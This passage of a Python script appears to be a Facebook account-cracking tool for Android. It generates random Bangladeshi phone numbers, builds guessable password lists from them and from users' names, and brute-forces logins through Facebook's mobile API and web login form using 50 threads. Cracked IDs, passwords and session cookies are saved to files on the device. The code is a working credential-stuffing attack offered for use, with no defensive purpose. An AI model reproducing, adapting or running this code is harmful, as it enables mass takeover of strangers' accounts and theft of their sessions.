                open('/sdcard/AMO-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/AMO-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}AMO-M3{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': 'f975ba9d-78d1-4b90-8d2f-7ee2c437a3a7', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': yek(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'X-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url = "https://api.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m➤ {A}[{G}AMO-OK{A}]{G} '+ids+f'|'+pas+'')
                open('/sdcard/AMO-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/AMO-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ BANGLADESH ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def bd():
    user=[]
    ck=[]
    clear()
    code = input(f"\x1b[38;5;46m➤{A} SIM CODES {R}:{A} 018 017 016 013\nSELECTION ▶︎ ")
    limit = int(input(f"\x1b[38;5;46m➤{A} EXAMPLE {R}:{A} 10000 20000 30000 \nLIMITS    ▶︎ "))
    xmk = input(f"\x1b[38;5;46m➤{A} WANT TO SEE COOKIE (Y/N) ▶︎ ︎")
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    with tred(max_workers=50) as crack_submit:
        clear();tl = str(len(user))      
        print(f"\x1b[38;5;46m➤{A} SIM CODE {R}:{A} {code}")
        print(f'\x1b[38;5;46m➤{A} TOTAL ID {R}:{R} '+tl+f' ')
        print(f"\x1b[38;5;46m➤{A} IF NO RESULT ON/OF AIRPLAN MODE")
        linex()
        for love in user:
            ids = code+love
            passlist = [ids,love,ids[:6],ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'Bangla','bangla','Free Fire','free fire','@#@#@#','@@@###']
            crack_submit.submit(__API__,ids,passlist,tl,ck)
    print("");linex();print(f"\x1b[38;5;46m➤{A} PROCESS HAS BEEN COMPLETED");print(f"\x1b[38;5;46m➤{A} TOTAL OK   ▶︎ \033[1;32m{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RN METHOD ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def __API__(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}AMO-RN{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    try:
        for pas in passlist:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\rx1b[38;5;46m➤ {cid} | {pas} | {coki} ');linex()
                        open('/sdcard/AMO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/AMO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\rx1b[38;5;46m➤ {A}[{G}AMO-OK{A}]{G} {cid} | {pas} ')
                        open('/sdcard/AMO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/OGGY-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break 
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ END ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
try: 
    Main()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
    print(e)                
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MR OGGY ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
